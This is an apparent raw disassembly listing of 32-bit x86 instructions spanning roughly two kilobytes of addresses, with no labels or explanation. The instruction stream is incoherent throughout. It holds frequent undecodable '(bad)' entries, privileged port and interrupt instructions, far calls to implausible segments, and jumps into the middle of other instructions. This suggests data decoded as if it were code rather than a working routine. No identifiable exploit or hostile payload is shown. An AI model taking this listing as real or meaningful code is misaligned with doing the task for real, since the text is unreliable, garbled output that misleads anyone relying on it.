  41ab3b:	call   0x3db3:0xe21f576
  41ab42:	lods   eax,DWORD PTR ds:[esi]
  41ab43:	rcr    BYTE PTR [ecx+eiz*2-0x7f],1
  41ab47:	dec    ebx
  41ab48:	mov    edi,0x3b674ae5
  41ab4d:	jae    0x41ab8a
  41ab4f:	lock repz mov cl,0x57
  41ab53:	inc    eax
  41ab54:	iret   
  41ab55:	mov    ch,0xf3
  41ab57:	add    edx,DWORD PTR [ecx-0x7488d34c]
  41ab5d:	daa    
  41ab5e:	ficom  DWORD PTR [ebx+0x15e8087f]
  41ab64:	jae    0x41aba3
  41ab66:	mov    cs,WORD PTR [edx+0x6056fd58]
  41ab6c:	icebp  
  41ab6d:	loopne 0x41ab86
  41ab6f:	pop    ebx
  41ab70:	mov    WORD PTR [eax-0x16],?
  41ab73:	push   edx
  41ab74:	xchg   BYTE PTR ds:[esi+esi*1],ch
  41ab78:	add    eax,0x57522b64
  41ab7d:	sbb    BYTE PTR [eax+0x54],cl
  41ab80:	fdivr  DWORD PTR ss:[ebx-0x3c]
  41ab84:	add    DWORD PTR [edi-0x2347c6d3],eax
  41ab8a:	sub    al,0xaf
  41ab8c:	xchg   ecx,eax
  41ab8d:	sub    DWORD PTR [edi-0x66],0x5d5fd93c
  41ab94:	repz cmp al,0x22
  41ab97:	and    DWORD PTR [edi-0x7],0x9
  41ab9b:	int3   
  41ab9c:	xor    ebx,DWORD PTR [edi]
  41ab9e:	repz mov ah,0x14
  41aba1:	sbb    edx,DWORD PTR [edx+0x4]
  41aba4:	xchg   edx,eax
  41aba5:	sbb    al,0x33
  41aba7:	dec    esi
  41aba8:	aas    
  41aba9:	inc    ecx
  41abaa:	icebp  
  41abab:	into   
  41abac:	lea    eax,[ebx]
  41abae:	or     eax,0x73cdc1b
  41abb3:	lock outs dx,DWORD PTR ds:[esi]
  41abb5:	orps   xmm1,XMMWORD PTR [edi-0x5204be66]
  41abbc:	dec    edi
  41abbd:	or     BYTE PTR [esi],ch
  41abbf:	mov    eax,ds:0x3d3d5dbf
  41abc4:	inc    ebp
  41abc5:	pop    es
  41abc6:	leave  
  41abc7:	and    edi,DWORD PTR [eax-0x67452fa2]
  41abcd:	jmp    0x32837552
  41abd2:	mov    dh,0x66
  41abd4:	int3   
  41abd5:	inc    edi
  41abd6:	push   esi
  41abd7:	lods   al,BYTE PTR ds:[esi]
  41abd8:	and    edi,DWORD PTR [eax-0x76a36edc]
  41abde:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41abe0:	callw  0xf776
  41abe4:	jmp    0x87ff654c
  41abe9:	daa    
  41abea:	adc    DWORD PTR ds:0xe754fad7,edx
  41abf0:	xor    BYTE PTR [edx+edx*4+0x77],bl
  41abf4:	dec    edx
  41abf5:	(bad)  
  41abf6:	pop    edx
  41abf7:	sahf   
  41abf8:	adc    bh,dh
  41abfa:	fadd   st(4),st
  41abfc:	gs pop ds
  41abfe:	jns    0x41abf7
  41ac00:	ror    BYTE PTR [ecx+eiz*2],0x9d
  41ac04:	(bad)  
  41ac06:	sbb    al,0xd7
  41ac08:	in     al,0x99
  41ac0a:	xor    DWORD PTR [edx-0x7db62d7f],esi
  41ac10:	not    BYTE PTR [edx+0x495bfb95]
  41ac16:	shl    BYTE PTR [esi+0x54],0x2c
  41ac1a:	(bad)
  41ac1e:	push   edx
  41ac1f:	add    ecx,DWORD PTR [eax]
  41ac21:	adc    edx,DWORD PTR ds:0x1d95c6aa
  41ac27:	loopne 0x41abb5
  41ac29:	ins    BYTE PTR es:[edi],dx
  41ac2a:	aaa    
  41ac2b:	dec    esp
  41ac2c:	or     dl,dh
  41ac2e:	inc    eax
  41ac2f:	inc    ebp
  41ac30:	mov    dh,0xb5
  41ac32:	xchg   ebp,eax
  41ac33:	jae    0x41ac05
  41ac35:	in     eax,dx
  41ac36:	adc    al,dh
  41ac38:	sbb    edi,esp
  41ac3a:	repz sub esi,DWORD PTR [esi+0x52]
  41ac3e:	nop
  41ac3f:	adc    eax,0x5a84cdfe
  41ac44:	test   eax,0x2ba0a55e
  41ac49:	sbb    DWORD PTR [ebx],0xabf072da
  41ac4f:	scas   al,BYTE PTR es:[edi]
  41ac50:	mov    ds:0xa3adfffa,al
  41ac55:	rcl    BYTE PTR [eax+0x61557186],0x78
  41ac5c:	leave  
  41ac5d:	les    esp,FWORD PTR [edx]
  41ac5f:	int3   
  41ac60:	xor    esi,DWORD PTR [edi]
  41ac62:	data16 (bad) 
  41ac64:	icebp  
  41ac65:	jno    0x41aca0
  41ac67:	repz xor ebp,DWORD PTR [edx-0x570f4cd0]
  41ac6e:	gs xchg ebx,eax
  41ac70:	inc    edx
  41ac71:	xor    DWORD PTR [ebp+0x19d2f39a],eax
  41ac77:	mov    al,0xba
  41ac79:	xchg   edi,eax
  41ac7a:	and    al,0xbf
  41ac7c:	fldcw  WORD PTR [eax-0x6b]
  41ac7f:	fs sbb ebx,esi
  41ac82:	shl    esi,cl
  41ac84:	mov    dh,0x8d
  41ac86:	adc    al,0x4a
  41ac88:	cmp    DWORD PTR [ecx-0x6bf69a1d],esi
  41ac8e:	xor    DWORD PTR [edx+0x1c],0xdb5f6067
  41ac95:	sub    al,0x1d
  41ac97:	aas    
  41ac98:	xor    DWORD PTR [edx],edx
	...
  41ad12:	add    BYTE PTR [eax],al
  41ad14:	push   ebx
  41ad15:	inc    edx
  41ad16:	or     DWORD PTR [ecx+ebx*1-0x2a100801],edi
  41ad1d:	pop    eax
  41ad1e:	cdq    
  41ad1f:	sar    DWORD PTR [esi-0x78560c6f],0x4c
  41ad26:	add    DWORD PTR [eax],eax
  41ad28:	outs   dx,BYTE PTR ds:[esi]
  41ad29:	pop    es
  41ad2a:	add    BYTE PTR [eax],al
  41ad2c:	sbb    DWORD PTR [edx+0x6e],0xffffff8a
  41ad30:	clc    
  41ad31:	push   eax
  41ad32:	sar    DWORD PTR [esi+0x24fc9bfb],1
  41ad38:	sub    al,0xb9
  41ad3a:	stos   BYTE PTR es:[edi],al
  41ad3b:	les    eax,FWORD PTR [esi]
  41ad3d:	out    dx,al
  41ad3e:	inc    ebx
  41ad3f:	pop    esp
  41ad40:	pop    ebp
  41ad41:	push   ss
  41ad42:	add    al,0xf3
  41ad44:	xchg   ebp,eax
  41ad45:	cld    
  41ad46:	inc    eax
  41ad47:	imul   ebx,DWORD PTR [eax],0x4f
  41ad4a:	imul   edx,eax,0xb5555284
  41ad50:	push   0x472ca1ee
  41ad55:	sub    DWORD PTR [eax-0x5665fb93],edx
  41ad5b:	jecxz  0x41ad65
  41ad5d:	dec    edi
  41ad5e:	int    0x56
  41ad60:	sub    eax,0xb6a70eff
  41ad65:	repz adc DWORD PTR [esi+0x40],0x1a8fe21e
  41ad6d:	cdq    
  41ad6e:	and    DWORD PTR [edi-0xa],ecx
  41ad71:	test   eax,0xd3765f6d
  41ad76:	jns    0x41ad39
  41ad78:	pusha  
  41ad79:	rol    DWORD PTR [edx],0x89
  41ad7c:	or     al,0x1b
  41ad7e:	in     al,0x93
  41ad80:	outs   dx,BYTE PTR ds:[esi]
  41ad81:	mov    bh,0xb6
  41ad83:	xor    eax,0x7c03d141
  41ad88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad89:	push   ss
  41ad8a:	mov    dh,0xfd
  41ad8c:	xchg   edx,eax
  41ad8d:	fiadd  WORD PTR ds:0x7d309b28
  41ad93:	popf   
  41ad94:	or     DWORD PTR fs:[eax-0x4988949f],ebp
  41ad9b:	mov    ch,0xb7
  41ad9d:	icebp  
  41ad9e:	fadd   st,st(2)
  41ada0:	fstp   DWORD PTR [esi-0x7f5463bb]
  41ada6:	mov    ebp,0x59d3f171
  41adab:	cdq    
  41adac:	mov    ds:0x1a554204,al
  41adb1:	jne    0x41ade0
  41adb3:	fimul  WORD PTR [edi]
  41adb5:	inc    esp
  41adb6:	xchg   BYTE PTR [edi+0x3f],ah
  41adb9:	mov    ds:0xc35571fd,eax
  41adbe:	lea    edx,[eax-0x4]
  41adc1:	jne    0x41adcb
  41adc3:	fisubr WORD PTR [ebx+0x13]
  41adc6:	imul   ebx,DWORD PTR [ecx],0x1d
  41adc9:	push   ebx
  41adca:	loop   0x41ae1a
  41adcc:	xchg   eax,edx
  41adce:	mov    al,ds:0xe7ac2c8e
  41add3:	jecxz  0x41ad9e
  41add5:	xchg   ecx,eax
  41add6:	arpl   bx,bp
  41add8:	hlt    
  41add9:	dec    esp
  41adda:	adc    al,0x13
  41addc:	push   es
  41addd:	xchg   DWORD PTR [edx],esi
  41addf:	pushf  
  41ade0:	jae    0x41ad9d
  41ade2:	push   ds
  41ade3:	mov    esp,0x826ecd65
  41ade8:	xor    eax,0x8f56b1ca
  41aded:	xchg   ebx,eax
  41adee:	repz mov bl,0xd4
  41adf1:	retf   0x259a
  41adf4:	mov    eax,0xc808033
  41adf9:	adc    bl,bl
  41adfb:	mov    BYTE PTR [eax+0x56],dh
  41adfe:	push   ebx
  41adff:	sub    dl,bh
  41ae01:	push   eax
  41ae02:	std    
  41ae03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae04:	add    eax,0xb3822e46
  41ae09:	(bad)  ds:0x890b638a
  41ae0f:	or     dl,dl
  41ae11:	mov    es,WORD PTR [edi]
  41ae13:	mov    bl,0x64
  41ae15:	cmp    cl,bl
  41ae17:	cmp    al,0x5a
  41ae19:	pop    ebx
  41ae1a:	sub    DWORD PTR [eax],edx
  41ae1c:	je     0x41ae3d
  41ae1e:	or     ah,BYTE PTR [ebp-0x38]
  41ae21:	sbb    al,0xd8
  41ae23:	ficom  WORD PTR [ebx-0x71]
  41ae26:	sbb    esi,0x34
  41ae29:	arpl   WORD PTR [eax+0x23],si
  41ae2c:	(bad)  
  41ae2d:	scas   al,BYTE PTR es:[edi]
  41ae2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae2f:	lock mov ds:0x584b8afa,eax
  41ae35:	jecxz  0x41ae33
  41ae37:	mov    al,ds:0x343eba5
  41ae3c:	jno    0x41ae4d
  41ae3e:	xchg   esi,eax
  41ae3f:	ret    0x9ea
  41ae42:	mov    edx,0xd0b80d60
  41ae47:	or     BYTE PTR [edi-0x44978f6a],dl
  41ae4d:	push   0xffffffd4
  41ae4f:	sbb    DWORD PTR [edx],ebp
  41ae51:	aas    
  41ae52:	mov    WORD PTR [ecx+0x4f43c034],fs
  41ae58:	jmp    0x7bac:0xbc8e5f43
  41ae5f:	mov    eax,0xd12fcf6d
  41ae64:	call   0xab66:0xf4eb17fa
  41ae6b:	sbb    cl,BYTE PTR [eax-0x23]
  41ae6e:	mov    ebp,0x93bfdfc0
  41ae73:	jecxz  0x41aea4
  41ae75:	jns    0x41aee2
  41ae77:	fistp  WORD PTR ds:0x85ed70a1
  41ae7d:	adc    DWORD PTR [ebx],0xffffffe9
  41ae80:	dec    edi
  41ae81:	jbe    0x41aeaa
  41ae83:	push   esi
  41ae84:	stos   DWORD PTR es:[edi],eax
  41ae85:	dec    ebp
  41ae86:	pop    ecx
  41ae87:	cs xchg ebx,eax
  41ae89:	pushf  
  41ae8a:	pop    edx
  41ae8b:	lahf   
  41ae8c:	pop    eax
  41ae8d:	mov    esp,0x7a240060
  41ae92:	dec    ebp
  41ae93:	pop    esi
  41ae94:	and    DWORD PTR [edx-0x49],ecx
  41ae97:	(bad)  
  41ae98:	pusha  
  41ae99:	adc    ch,BYTE PTR [eax+0x2d2ea2dd]
  41ae9f:	dec    ebp
  41aea0:	mov    esi,ebp
  41aea2:	push   cs
  41aea3:	ret    
  41aea4:	and    ebx,DWORD PTR [eax-0x54]
  41aea7:	cdq    
  41aea8:	or     ch,BYTE PTR [edi]
  41aeaa:	iret   
  41aeab:	sbb    al,0xcc
  41aead:	mov    ds:0x3418562b,eax
  41aeb2:	jne    0x41aea9
  41aeb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aeb5:	rol    eax,cl
  41aeb7:	test   DWORD PTR [ecx-0x2d],edi
  41aeba:	mov    eax,0xc6e2b3f5
  41aebf:	jge    0x41ae6d
  41aec1:	test   al,ch
  41aec3:	sub    BYTE PTR [edi+0x14],dh
  41aec6:	neg    BYTE PTR [esi]
  41aec8:	xchg   ebp,eax
  41aec9:	sar    BYTE PTR [ecx+ecx*2],1
  41aecc:	cmp    BYTE PTR [eax],ah
  41aece:	jne    0x41af1e
  41aed0:	ss into 
  41aed2:	mov    BYTE PTR [eax],dh
  41aed4:	mov    ch,0x70
  41aed6:	iret   
  41aed7:	div    BYTE PTR [ebp-0x5c97cbe]
  41aedd:	cs pop eax
  41aedf:	lock inc edi
  41aee1:	or     ebx,DWORD PTR [edx+esi*2]
  41aee4:	lods   al,BYTE PTR ds:[esi]
  41aee5:	push   es
  41aee6:	push   DWORD PTR [ebx]
  41aee8:	(bad)  
  41aee9:	sbb    al,0x96
  41aeeb:	movd   mm6,edx
  41aeee:	push   esi
  41aeef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aef0:	lods   al,BYTE PTR ds:[esi]
  41aef1:	push   edx
  41aef2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aef3:	outs   dx,BYTE PTR ds:[esi]
  41aef4:	int3   
  41aef5:	int3   
  41aef6:	pop    edx
  41aef7:	pop    ds
  41aef8:	push   eax
  41aef9:	outs   dx,DWORD PTR ds:[esi]
  41aefa:	and    ah,BYTE PTR [eax]
  41aefc:	push   0xbebd157f
  41af01:	into   
  41af02:	out    dx,al
  41af03:	add    eax,0x931b2b62
  41af08:	addr16 xchg esp,eax
  41af0a:	enter  0x5831,0xf7
  41af0e:	mov    ebx,DWORD PTR [ecx-0x787ae5d9]
  41af14:	out    dx,eax
  41af15:	adc    DWORD PTR [ebx-0x37],edx
  41af18:	call   0xc185:0x9e0151db
  41af1f:	sbb    DWORD PTR [ebx-0x30],esp
  41af22:	inc    eax
  41af23:	mov    eax,ds:0x23e70889
  41af28:	aad    0xa5
  41af2a:	inc    ebp
  41af2b:	aad    0x3d
  41af2d:	mov    bh,0x98
  41af2f:	addr16 sbb al,0xb2
  41af32:	cmp    al,0x48
  41af34:	jl     0x41af3c
  41af36:	dec    ebx
  41af37:	lea    edx,[ebx-0x3df1ceea]
  41af3d:	push   cs
  41af3e:	xor    dh,BYTE PTR [eax-0x45]
  41af41:	outs   dx,BYTE PTR ds:[esi]
  41af42:	cdq    
  41af43:	and    eax,0xab7e0703
  41af48:	push   esp
  41af49:	loop   0x41af26
  41af4b:	and    cl,BYTE PTR [eax-0x65]
  41af4e:	bound  edi,QWORD PTR [ecx]
  41af50:	outs   dx,BYTE PTR ds:[esi]
  41af51:	pop    ebx
  41af52:	imul   DWORD PTR [ebp+ecx*2-0x219b7ecc]
  41af59:	ficom  DWORD PTR ds:0xc3894456
  41af5f:	daa    
  41af60:	push   0x5e
  41af62:	inc    ebp
  41af63:	aam    0xe9
  41af65:	sahf   
  41af66:	sbb    ah,BYTE PTR [ecx]
  41af68:	mov    BYTE PTR [edi+0x193e3571],ch
  41af6e:	add    eax,0xe44dcb6
  41af73:	or     al,0xc6
  41af75:	imul   eax,DWORD PTR [ecx+0x74],0x5e
  41af79:	sub    ah,BYTE PTR [edx]
  41af7b:	scas   al,BYTE PTR es:[edi]
  41af7c:	xor    ebp,DWORD PTR [ecx+eax*4-0x76790f64]
  41af83:	lds    esi,FWORD PTR [esi]
  41af85:	aaa    
  41af86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af87:	(bad)  
  41af88:	sbb    ah,BYTE PTR [ebx-0x6a3a88d3]
  41af8e:	push   ebp
  41af8f:	jmp    0x114e3b95
  41af94:	arpl   si,bp
  41af96:	inc    ebx
  41af97:	and    bh,BYTE PTR [edx]
  41af99:	pop    edi
  41af9a:	(bad)  
  41af9b:	lock adc ebx,esp
  41af9e:	es pusha 
  41afa0:	ja     0x41afb5
  41afa2:	jg     0x41af80
  41afa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afa5:	outs   dx,BYTE PTR ds:[esi]
  41afa6:	cwde   
  41afa7:	cmp    BYTE PTR [ebx+0x4b],dh
  41afaa:	push   cs
  41afab:	das    
  41afac:	js     0x41af44
  41afae:	rcr    BYTE PTR [edx],0xf1
  41afb1:	or     bl,BYTE PTR [ecx+0x15c971d1]
  41afb7:	cmp    ebx,DWORD PTR [ebp+ebp*8+0x7504bb34]
  41afbe:	jecxz  0x41af5a
  41afc0:	(bad)  
  41afc1:	lock push ebx
  41afc3:	(bad)  
  41afc4:	push   ss
  41afc5:	inc    ebp
  41afc6:	inc    ebx
  41afc7:	cmp    ah,BYTE PTR [ebx-0x231f8a58]
  41afcd:	inc    ecx
  41afce:	inc    esp
  41afcf:	je     0x41b02f
  41afd1:	jge    0x41aff6
  41afd3:	scas   al,BYTE PTR es:[edi]
  41afd4:	sbb    eax,0x5e32193a
  41afd9:	daa    
  41afda:	into   
  41afdb:	and    al,BYTE PTR [edx]
  41afdd:	and    al,ch
  41afdf:	je     0x41afb7
  41afe1:	pusha  
  41afe2:	stos   BYTE PTR es:[edi],al
  41afe3:	repz xor eax,0x8dda378b
  41afe9:	sbb    bh,BYTE PTR [eax]
  41afeb:	push   esi
  41afec:	mov    ebp,0x8719e4b2
  41aff1:	sub    DWORD PTR [ebp-0x18],ecx
  41aff4:	out    0x6a,al
  41aff6:	adc    eax,0x2e552a9a
  41affb:	in     eax,0xcd
  41affd:	imul   ebp,DWORD PTR [esi],0x58514454
  41b003:	rcr    DWORD PTR [edx-0x55],cl
  41b006:	mov    DWORD PTR [ecx+0x4],ebx
  41b009:	mov    esi,0xcd82c6f7
  41b00e:	jnp    0x41afa7
  41b010:	das    
  41b011:	cmp    al,0xad
  41b013:	sbb    bl,cl
  41b015:	ficomp WORD PTR [ecx]
  41b017:	mov    fs,edi
  41b019:	(bad)  
  41b01a:	xlat   BYTE PTR ds:[ebx]
  41b01b:	pop    eax
  41b01c:	sub    ecx,DWORD PTR [edi+eiz*8+0x43]
  41b020:	bound  edx,QWORD PTR [ebx-0x43461744]
  41b026:	add    ebx,DWORD PTR [ebx+0x2ff0be31]
  41b02c:	xrelease mov BYTE PTR [edx],0xa0
  41b030:	retf   0x7a90
  41b033:	cmp    eax,0xb1044467
  41b038:	dec    esp
  41b039:	mov    BYTE PTR [ecx+0x7d],bl
  41b03c:	inc    ecx
  41b03d:	popf   
  41b03e:	das    
  41b03f:	into   
  41b040:	add    al,0xeb
  41b042:	es mov ebx,0x9d254438
  41b048:	mov    dh,0x66
  41b04a:	and    ebp,DWORD PTR [ecx-0x3c09a9f8]
  41b050:	jmp    0x23805ede
  41b055:	inc    eax
  41b056:	dec    eax
  41b057:	xchg   bl,bh
  41b059:	icebp  
  41b05a:	xchg   esp,eax
  41b05b:	inc    edi
  41b05c:	iret   
  41b05d:	jle    0x41afee
  41b05f:	cmp    esi,eax
  41b061:	cmp    ebp,DWORD PTR [ebx-0x20]
  41b064:	clc    
  41b065:	jb     0x41aff6
  41b067:	push   ecx
  41b068:	and    bl,al
  41b06a:	cmp    ch,BYTE PTR [ecx-0x52d7f2ab]
  41b070:	test   DWORD PTR [ebp-0x4dc0135e],edx
  41b076:	push   ds
  41b077:	inc    eax
  41b078:	mov    esp,0x329e0313
  41b07d:	aaa    
  41b07e:	fcom   QWORD PTR [edi+0x5f7c13df]
  41b084:	out    0x19,eax
  41b086:	jbe    0x41b0aa
  41b088:	out    0xe7,eax
  41b08a:	or     esi,0xb5cb578c
  41b090:	shl    DWORD PTR [ecx+0x7c116c48],1
  41b096:	jb     0x41b056
  41b098:	xor    esp,esp
  41b09a:	adc    bl,BYTE PTR [edi]
  41b09c:	pop    esp
  41b09d:	and    eax,0x5c9c29d3
  41b0a2:	adc    al,0x79
  41b0a4:	fisttp QWORD PTR [edi]
  41b0a6:	xor    al,cl
  41b0a8:	ds inc eax
  41b0aa:	and    ah,BYTE PTR [edi]
  41b0ac:	out    dx,al
  41b0ad:	and    BYTE PTR [eax],ah
  41b0af:	sub    ebx,DWORD PTR [ebx-0x6343992]
  41b0b5:	imul   esi,DWORD PTR [esi],0xffffffae
  41b0b8:	hlt    
  41b0b9:	add    BYTE PTR [eax+ebx*1],dl
  41b0bc:	jne    0x41b0ec
  41b0be:	lods   al,BYTE PTR ds:[esi]
  41b0bf:	adc    al,0xe1
  41b0c1:	sbb    ecx,DWORD PTR [esi+eax*4]
  41b0c4:	mov    WORD PTR [esi],gs
  41b0c6:	jp     0x41b13c
  41b0c8:	and    ebp,DWORD PTR [edi]
  41b0ca:	mov    ah,0xf6
  41b0cc:	daa    
  41b0cd:	jp     0x41b08a
  41b0cf:	mov    bx,0xfddc
  41b0d3:	pushf  
  41b0d4:	mov    ah,0xf3
  41b0d6:	jb     0x41b0e5
  41b0d8:	ins    DWORD PTR es:[edi],dx
  41b0d9:	loopne 0x41b131
  41b0db:	adc    esp,ebx
  41b0dd:	and    eax,0x9a7fd06
  41b0e2:	jle    0x41b10f
  41b0e4:	and    al,0x67
  41b0e6:	shr    DWORD PTR [edi],cl
  41b0e8:	mov    ebx,0xb7456e06
  41b0ed:	mov    ds:0x177b1e2c,al
  41b0f2:	cmp    BYTE PTR [ebp+0x9dce0e0],0xf3
  41b0f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0fa:	out    dx,eax
  41b0fb:	test   al,0x41
  41b0fd:	lods   al,BYTE PTR ds:[esi]
  41b0fe:	or     al,0xcd
  41b100:	push   eax
  41b101:	sbb    ah,bl
  41b103:	imul   edi,DWORD PTR [eax],0xcc0f75c8
  41b109:	lods   eax,DWORD PTR ds:[esi]
  41b10a:	mov    ah,0xa0
  41b10c:	ds push ebp
  41b10e:	add    al,0x8a
  41b110:	pushf  
  41b111:	ins    DWORD PTR es:[edi],dx
  41b112:	push   ebx
  41b113:	fs mov ch,0xf0
  41b116:	aam    0x51
  41b118:	mov    ch,0xf5
  41b11a:	leave  
  41b11b:	push   edi
  41b11c:	into   
  41b11d:	and    eax,0x2b082332
  41b122:	fisubr DWORD PTR [edx]
  41b124:	scas   al,BYTE PTR es:[edi]
  41b125:	and    al,0x3e
  41b127:	push   esi
  41b128:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b129:	mov    edi,0x36d91c0b
  41b12e:	and    bh,BYTE PTR [ecx]
  41b130:	enter  0x65b9,0xe
  41b134:	lods   al,BYTE PTR ds:[esi]
  41b135:	call   0xa3b2f3c8
  41b13a:	stc    
  41b13b:	daa    
  41b13c:	adc    BYTE PTR [ebx+0x42],bh
  41b13f:	or     BYTE PTR [edx-0xa],cl
  41b142:	loop   0x41b128
  41b144:	cmp    eax,0xdfc8502f
  41b149:	cdq    
  41b14a:	test   eax,0x78dab582
  41b14f:	xchg   esp,eax
  41b150:	mov    ebp,DWORD PTR [ecx+0x5f5a0ef]
  41b156:	or     al,0xe6
  41b158:	adc    BYTE PTR [ecx],cl
  41b15a:	sahf   
  41b15b:	shl    DWORD PTR [edi+0xa],0xb7
  41b15f:	shl    DWORD PTR [ebx-0x10],0x30
  41b163:	push   0xffffffff
  41b165:	mov    ah,0x32
  41b167:	imul   ecx,DWORD PTR [ecx],0x54
  41b16a:	mov    ebx,DWORD PTR [ebp+0x3c]
  41b16d:	out    0xdc,al
  41b16f:	jmp    0x41b1ae
  41b171:	and    BYTE PTR [ebx],ch
  41b173:	adc    edx,DWORD PTR [ecx-0x5946cb31]
  41b179:	lahf   
  41b17a:	push   0x1c
  41b17c:	rsqrtps xmm0,xmm6
  41b17f:	pushf  
  41b180:	je     0x41b131
  41b182:	push   esi
  41b183:	mov    cl,BYTE PTR [ebx]
  41b185:	out    dx,al
  41b186:	mov    dh,0xc
  41b188:	shl    BYTE PTR [edx+0xc],1
  41b18b:	fwait
  41b18c:	mov    dl,0xd1
  41b18e:	stc    
  41b18f:	mov    al,0x5e
  41b191:	sub    eax,0x7da6260e
  41b196:	cdq    
  41b197:	sbb    edx,DWORD PTR [eax]
  41b199:	std    
  41b19a:	xor    DWORD PTR [edx+0x75b3dff4],ebx
  41b1a0:	jae    0x41b19e
  41b1a2:	cs (bad) 
  41b1a4:	cmp    BYTE PTR [esi-0x2],bl
  41b1a7:	jmp    0x41b227
  41b1a9:	and    cl,al
  41b1ab:	std    
  41b1ac:	stc    
  41b1ad:	inc    ebx
  41b1ae:	(bad)  
  41b1af:	pop    esp
  41b1b0:	mov    al,ds:0x2a7ac66f
  41b1b5:	push   esi
  41b1b6:	imul   ebp,ebp,0xffffff90
  41b1b9:	xchg   esp,eax
  41b1ba:	add    ebx,eax
  41b1bc:	pop    esp
  41b1bd:	test   DWORD PTR [esi+0x3295e795],ecx
  41b1c3:	test   BYTE PTR [ecx-0x788e7e02],dh
  41b1c9:	arpl   WORD PTR [ebx-0x6a],bx
  41b1cc:	out    dx,al
  41b1cd:	(bad)  
  41b1ce:	test   BYTE PTR [esi+0x51161c10],al
  41b1d4:	jmp    0x5003:0xa35ee2c
  41b1db:	lahf   
  41b1dc:	adc    al,0x6b
  41b1de:	mov    ds:0xa5d97db6,al
  41b1e3:	sub    eax,0xc3a957e2
  41b1e8:	mov    ah,0xbb
  41b1ea:	pop    ebx
  41b1eb:	jg     0x41b1cc
  41b1ed:	xor    al,0x12
  41b1ef:	loop   0x41b1f9
  41b1f1:	jp     0x41b17b
  41b1f3:	ret    0x4ca6
  41b1f6:	pop    edi
  41b1f7:	push   ebx
  41b1f8:	dec    esp
  41b1f9:	ror    BYTE PTR [edx-0x7f5e2c56],cl
  41b1ff:	popa   
  41b200:	push   es
  41b201:	enter  0x4bd5,0xe6
  41b205:	pop    ds
  41b206:	jle    0x41b1e1
  41b208:	imul   ebx,DWORD PTR [ebx+0x7e823af6],0x55
  41b20f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b210:	mov    cs,WORD PTR [ebp-0x651e8cdf]
  41b216:	jns    0x41b206
  41b218:	push   ecx
  41b219:	push   esi
  41b21a:	hlt    
  41b21b:	sub    al,0x81
  41b21d:	shl    DWORD PTR [esi],cl
  41b21f:	xchg   esi,eax
  41b220:	or     ebx,DWORD PTR [ebx+eax*4]
  41b223:	in     al,0x72
  41b225:	push   0x53b98b7
  41b22a:	fmul   st(5),st
  41b22c:	xor    eax,0x24bbe34c
  41b231:	dec    esp
  41b232:	sub    ah,BYTE PTR cs:[ebx-0x39]
  41b236:	adc    cl,BYTE PTR ds:0xa5aa704d
  41b23c:	shl    DWORD PTR [ecx+0x523a8eac],cl
  41b242:	dec    bp
  41b244:	mov    WORD PTR [ebp-0x55d5b4],?
  41b24a:	mov    ch,0x12
  41b24c:	jns    0x41b2c3
  41b24e:	and    eax,0x26c9894b
  41b253:	(bad)  
  41b254:	leave  
  41b255:	int    0xcd
  41b257:	in     al,0xe0
  41b259:	mov    edi,0x6cccd88b
  41b25e:	mov    ebx,ebp
  41b260:	cli    
  41b261:	minps  xmm6,XMMWORD PTR [ecx+edi*4-0xd]
  41b266:	cmp    al,0xa0
  41b268:	hlt    
  41b269:	jae    0x41b238
  41b26b:	or     ebx,DWORD PTR ds:0x88e652fc
  41b271:	xchg   edi,eax
  41b272:	jmp    0x41b2de
  41b274:	sub    eax,0xf5036bb2
  41b279:	mov    esp,0x2323a2c2
  41b27e:	int3   
  41b27f:	stos   BYTE PTR es:[edi],al
  41b280:	push   ebp
  41b281:	jno    0x41b2f0
  41b283:	push   esp
  41b284:	bound  ecx,QWORD PTR [esi+0x1d632e1c]
  41b28a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b28b:	cwde   
  41b28c:	es inc eax
  41b28e:	sub    DWORD PTR [ecx],ecx
  41b290:	(bad)  
  41b291:	jb     0x41b304
  41b293:	into   
  41b294:	mov    edi,0x277454ab
  41b299:	call   0xa10a:0xf5ec5b8c
  41b2a0:	lods   al,BYTE PTR ds:[esi]
  41b2a1:	stos   BYTE PTR es:[edi],al
  41b2a2:	stos   DWORD PTR es:[edi],eax
  41b2a3:	imul   eax,DWORD PTR [esi+0x5],0x74
  41b2a7:	fsub   QWORD PTR [edi+0x3df9a21b]
  41b2ad:	inc    ecx
  41b2ae:	mov    ah,0xe7
  41b2b0:	popf   
  41b2b1:	shl    BYTE PTR [edi-0x5ad71d06],cl
  41b2b7:	imul   esi,DWORD PTR [edx],0x4
  41b2ba:	add    BYTE PTR [ebp-0x59],cl
  41b2bd:	mov    esp,0xe1ad9979
  41b2c2:	inc    eax
  41b2c3:	inc    esp
  41b2c4:	dec    ebp
  41b2c5:	or     esi,DWORD PTR [edi]
  41b2c7:	mov    ds:0x8caaf6f4,eax
  41b2cc:	dec    esi
  41b2cd:	cdq    
  41b2ce:	out    0xa1,al
  41b2d0:	mov    bh,0xb
  41b2d2:	jns    0x41b327
  41b2d4:	cmp    DWORD PTR [ecx-0x80],ecx
  41b2d7:	fnstcw WORD PTR [edi-0x5e3e595e]
  41b2dd:	cmp    DWORD PTR [edx-0x72299249],esp
  41b2e3:	inc    esp
  41b2e4:	lea    edi,[ebp-0x7974a92c]
  41b2ea:	in     al,dx
  41b2eb:	aaa    
  41b2ec:	cmp    al,0xbb
  41b2ee:	pop    ds
  41b2ef:	cmp    dl,BYTE PTR ds:0x719ce771
  41b2f5:	clc    
  41b2f6:	pop    edi
  41b2f7:	in     eax,dx
  41b2f8:	jge    0x41b2ab
  41b2fa:	sbb    ebx,DWORD PTR [ecx-0x47fbc7bd]
  41b300:	das    
  41b301:	pop    eax
  41b302:	xchg   esi,eax
  41b303:	xchg   ebp,eax
  41b304:	adc    eax,0x8d718c75
  41b309:	cdq    
  41b30a:	sahf   
  41b30b:	cmp    al,0xe5
